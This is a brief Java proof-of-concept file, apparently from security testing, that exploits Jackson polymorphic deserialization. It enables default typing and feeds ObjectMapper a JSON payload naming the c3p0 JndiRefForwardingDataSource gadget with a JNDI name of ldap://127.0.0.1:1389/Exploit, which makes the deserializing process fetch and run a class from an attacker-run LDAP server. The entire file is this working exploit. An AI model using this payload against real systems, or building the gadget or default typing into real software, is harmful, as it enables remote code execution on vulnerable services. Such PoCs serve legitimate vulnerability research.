package com.test.jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

public class C3p0 {

    public static void main(String[] args) {
        String payload = "[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",{\"jndiName\":\"ldap://127.0.0.1:1389/Exploit\",\"loginTimeout\":0}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        try {
            mapper.readValue(payload, Object.class);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
